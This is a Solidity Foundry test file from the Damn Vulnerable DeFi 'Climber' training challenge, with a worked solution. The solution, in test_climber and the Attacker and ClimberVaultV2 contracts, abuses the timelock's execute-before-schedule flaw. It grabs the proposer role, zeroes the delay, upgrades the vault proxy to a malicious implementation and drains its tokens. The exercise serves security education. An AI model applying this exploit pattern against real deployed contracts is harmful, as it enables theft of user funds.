// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IAccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberVaultV2 newVaultImpl = new ClimberVaultV2();
        Attacker attacker = new Attacker(address(timelock));
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(attacker);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSelector(
            IAccessControl.grantRole.selector,
            PROPOSER_ROLE,
            address(attacker)
        );
        dataElements[1] = abi.encodeCall(ClimberTimelock.updateDelay, (0));
        dataElements[2] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            address(newVaultImpl),
            bytes("")
        );
        dataElements[3] = abi.encodeCall(Attacker.attack, ());

        attacker.arm(targets, values, dataElements, bytes32(0));

        timelock.execute(targets, values, dataElements, bytes32(0));

        ClimberVaultV2(address(vault)).sweepFunds(
            address(token),
            recovery,
            address(vault)
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}

contract Attacker {
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    address payable timelock;

    constructor(address _timelock) {
        timelock = payable(_timelock);
    }

    function arm(
        address[] memory _targets,
        uint256[] memory _values,
        bytes[] memory _dataElements,
        bytes32 _salt
    ) external {
        targets = _targets;
        values = _values;
        dataElements = _dataElements;
        salt = _salt;
    }

    function attack() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }
}

contract ClimberVaultV2 is ClimberVault {
    function sweepFunds(
        address token,
        address recovery,
        address proxy
    ) external {
        SafeTransferLib.safeTransfer(
            token,
            recovery,
            IERC20(token).balanceOf(address(proxy))
        );
    }
}
